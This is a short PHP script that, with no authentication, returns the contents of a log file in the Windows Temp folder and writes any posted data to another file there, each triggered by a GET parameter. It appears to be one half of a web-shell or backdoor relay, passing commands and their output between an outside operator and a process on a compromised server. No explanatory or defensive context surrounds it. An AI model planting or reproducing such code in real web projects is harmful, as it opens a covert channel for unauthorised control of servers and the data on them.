<?php 
if (@$_GET['r']){
    readfile("C:\\Windows\\Temp\\out.log");
}
if (@$_GET['w']){
    file_put_contents("C:\\Windows\\Temp\\in.log",$_POST["data"]);
}
